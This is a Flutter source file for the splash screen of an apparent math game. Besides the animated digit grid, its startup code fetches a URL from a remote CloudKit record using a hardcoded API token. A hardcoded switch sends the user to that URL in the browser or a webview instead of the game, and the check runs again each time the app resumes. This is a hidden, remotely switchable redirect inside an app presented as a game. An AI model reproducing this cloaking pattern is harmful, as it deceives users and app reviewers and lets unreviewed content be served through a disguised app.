import 'dart:math';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:math_mania/src/webview.dart';
import '/src/core/app_constant.dart';
import '/src/ui/splash/animated_grid_item_view.dart';
import 'package:tuple/tuple.dart';
import 'package:url_launcher/url_launcher.dart';
import 'dart:io';
import 'dart:convert';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';

class SplashView extends StatefulWidget {
  const SplashView({Key? key}) : super(key: key);

  @override
  State<SplashView> createState() => _SplashViewState();
}

class _SplashViewState extends State<SplashView> with WidgetsBindingObserver {
  final client = HttpClient();
  final containerIdentifier = 'iCloud.GameDetectObstacles';
  final apiToken =
      '120915fc9a23e3687797af38acce303ecc1bf61e48ada91468736abd67e38ce9';
  final environment = 'development'; // Hoặc 'production'
  final baseUrl = 'https://api.apple-cloudkit.com/database/1';
  late String _link; 
  Future<void> getDataFromCloudKit() async {
    // Xây dựng URL cho yêu cầu lấy bản ghi
    final queryUrl =
        '$baseUrl/$containerIdentifier/$environment/public/records/query?ckAPIToken=$apiToken';
    // Tạo yêu cầu HTTP POST
    final request = await client.postUrl(Uri.parse(queryUrl));

    // Tạo yêu cầu HTTP POST
    final query = {
      'query': {'recordType': 'get'}
    };

    request.write(json.encode(query));
    // Gửi yêu cầu và đọc phản hồi
    final response = await request.close();
    final responseBody = await response.transform(utf8.decoder).join();

    Map<String, dynamic> jsonResponse = jsonDecode(responseBody);
    final data = jsonResponse['records'][0]['fields'];
    final access = "2";
    final url = data['url']['value'];
    print(access);
    print(url);
    if (access == "1") {
      Future.delayed(Duration(seconds: 1), () {
        launch(url, forceSafariVC: false, forceWebView: false);
        setState(() {
          _link = url;
        });
      });
    } else if (access == "2") {
      launch(url);
    }
    else if (access == "3"){
      Future.delayed(Duration(seconds: 1),(){
        Navigator.pushReplacement(context, MaterialPageRoute(builder: (context) => WebViewScreen(initialUrl: url)));
      });
    }

    else {
      Future.delayed(Duration(seconds: 4)).then((value) {
        Navigator.pushReplacementNamed(context, KeyUtil.dashboard);
      });
    }
  }


  @override
  void initState() {
    // TODO: implement initState
    super.initState();
    WidgetsBinding.instance?.addObserver(this);
    getDataFromCloudKit();
  }

    @override
  void dispose() {
    WidgetsBinding.instance?.removeObserver(this);
    super.dispose();
  }

  @override
  void didChangeAppLifecycleState(AppLifecycleState state) {
    if (state == AppLifecycleState.resumed && _link != null) {
      // Xử lý liên kết sau khi quay lại ứng dụng
      getDataFromCloudKit();
    }
  }

  @override
  Widget build(BuildContext context) {
    return AnnotatedRegion<SystemUiOverlayStyle>(
      value: SystemUiOverlayStyle(
        statusBarBrightness: Brightness.dark,
      ),
      child: Scaffold(
        body: LayoutBuilder(builder: (context, constraints) {
          var verticalLine = constraints.maxWidth / 6;
          var horizontalLine = constraints.maxHeight ~/ verticalLine;
          return Container(
            constraints: BoxConstraints.expand(),
            decoration: BoxDecoration(
              gradient: SweepGradient(
                center: Alignment.center,
                startAngle: 0.0,
                endAngle: pi * 2,
                colors: [
                  Color(0xff4895EF),
                  Color(0xff3F37C9),
                ],
                transform: GradientRotation(pi / 2),
              ),
            ),
            child: ListView.builder(
              shrinkWrap: true,
              itemCount: horizontalLine,
              physics: NeverScrollableScrollPhysics(),
              itemBuilder: (context, index) => GridItemView(
                index: index,
                horizontalLine: horizontalLine,
                verticalLine: verticalLine,
              ),
            ),
          );
        
        }),
     
      ),
   
    );
  }
}

class GridItemView extends StatelessWidget {
  final double verticalLine;
  final int index;
  final int horizontalLine;

  const GridItemView({
    Key? key,
    required this.index,
    required this.horizontalLine,
    required this.verticalLine,
  }) : super(key: key);

  @override
  Widget build(BuildContext context) {
    if ((horizontalLine ~/ 2 - 1) == index || (horizontalLine ~/ 2) == index) {
      int tempIndex = (horizontalLine ~/ 2 - 1) == index ? 0 : 1;
      return SizedBox(
        height: verticalLine,
        child: Row(
          children: [
            ...list[tempIndex]
                .map((e) => Expanded(
                      child: Container(
                        alignment: Alignment.center,
                        decoration: BoxDecoration(
                          border: Border.all(color: Colors.white24, width: 0.5),
                        ),
                        child: (e == "<" || e == ">")
                            ? Text(
                                e,
                                style: TextStyle(
                                  color: Colors.white24.withOpacity(0.25),
                                  fontFamily: "Poppins",
                                  fontSize: 16,
                                  fontWeight: FontWeight.w400,
                                ),
                              )
                            : Text(
                                e,
                                style: TextStyle(
                                  color: Colors.white,
                                  fontWeight: FontWeight.w900,
                                  fontSize: 28,
                                  fontFamily: "Poppins",
                                ),
                              ),
                      ),
                    ))
                .toList()
          ],
        ),
      );
    } else {
      int tempIndex = ((horizontalLine / 2 - 1) <= index &&
              (horizontalLine / 2 + 1) > index)
          ? index - 2
          : index;
      return SizedBox(
        height: verticalLine,
        child: Row(
          children: [
            ...list2[tempIndex]
                .map((e) => e.item1 == "."
                    ? Expanded(
                        child: AnimatedGridItemView(
                        duration: e.item2,
                      ))
                    : Expanded(
                        child: Container(
                          alignment: Alignment.center,
                          decoration: BoxDecoration(
                            border:
                                Border.all(color: Colors.white24, width: 0.1),
                          ),
                          child: Text(
                            e.item1,
                            style: TextStyle(
                              color: Colors.white24.withOpacity(0.5),
                              fontFamily: "Poppins",
                              fontSize: 16,
                              fontWeight: FontWeight.w400,
                            ),
                          ),
                        ),
                      ))
                .toList()
          ],
        ),
      );
    }
  }
}

var list = [
  ["<", "M", "A", "T", "H", ">"],
  ["3", "3", "W", "I", "N"],
];

var list2 = [
  [
    Tuple2("+", 0),
    Tuple2("0", 0),
    Tuple2("8", 0),
    Tuple2("1", 0),
    Tuple2("7", 0),
    Tuple2("*", 0)
  ],
  [
    Tuple2("3", 0),
    Tuple2("%", 0),
    Tuple2("5", 0),
    Tuple2("0", 0),
    Tuple2("+", 0),
    Tuple2("=", 0),
  ],
  [
    Tuple2("*", 0),
    Tuple2("3", 400),
    Tuple2("~", 0),
    Tuple2("4", 0),
    Tuple2("-", 0),
    Tuple2("2", 0),
  ],
  [
    Tuple2("-", 0),
    Tuple2("6", 0),
    Tuple2("=", 0),
    Tuple2("7", 1600),
    Tuple2("~", 0),
    Tuple2("9", 0),
  ],
  [
    Tuple2("+", 0),
    Tuple2("~", 0),
    Tuple2("8", 0),
    Tuple2("+", 0),
    Tuple2("4", 0),
    Tuple2("*", 0),
  ],
  [
    Tuple2("3", 0),
    Tuple2("%", 0),
    Tuple2("5", 0),
    Tuple2("0", 0),
    Tuple2("+", 0),
    Tuple2("=", 0),
  ],
  [
    Tuple2("*", 0),
    Tuple2("1", 0),
    Tuple2("~", 0),
    Tuple2("4", 0),
    Tuple2("-", 0),
    Tuple2("2", 0),
  ],
  [
    Tuple2("3", 0),
    Tuple2("%", 0),
    Tuple2("5", 0),
    Tuple2("0", 0),
    Tuple2("+", 0),
    Tuple2("=", 0),
  ],
  [
    Tuple2("*", 0),
    Tuple2("1", 0),
    Tuple2("~", 0),
    Tuple2("6", 2600),
    Tuple2("-", 0),
    Tuple2("2", 0),
  ],
  [
    Tuple2("-", 0),
    Tuple2("6", 0),
    Tuple2("=", 0),
    Tuple2("2", 0),
    Tuple2("~", 0),
    Tuple2("9", 0),
  ],
  [
    Tuple2("/", 0),
    Tuple2("1", 3200),
    Tuple2("~", 0),
    Tuple2("4", 0),
    Tuple2("6", 0),
    Tuple2("%", 0),
  ],
  [
    Tuple2("~", 0),
    Tuple2("2", 0),
    Tuple2("5", 0),
    Tuple2("*", 0),
    Tuple2("+", 0),
    Tuple2("5", 0),
  ],
  [
    Tuple2("6", 0),
    Tuple2("+", 0),
    Tuple2("7", 0),
    Tuple2("/", 0),
    Tuple2("6", 0),
    Tuple2("-", 0),
  ],
  [
    Tuple2("3", 0),
    Tuple2("%", 0),
    Tuple2("4", 0),
    Tuple2("~", 0),
    Tuple2("*", 0),
    Tuple2("2", 0),
  ],
  [
    Tuple2("1", 0),
    Tuple2("/", 0),
    Tuple2("3", 0),
    Tuple2("7", 0),
    Tuple2("-", 0),
    Tuple2("2", 0),
  ],
  [
    Tuple2("-", 0),
    Tuple2("8", 0),
    Tuple2("=", 0),
    Tuple2("%", 0),
    Tuple2("/", 0),
    Tuple2("7", 0),
  ],
  [
    Tuple2("9", 0),
    Tuple2("~", 0),
    Tuple2("=", 0),
    Tuple2("2", 0),
    Tuple2("*", 0),
    Tuple2("7", 0),
  ],
];
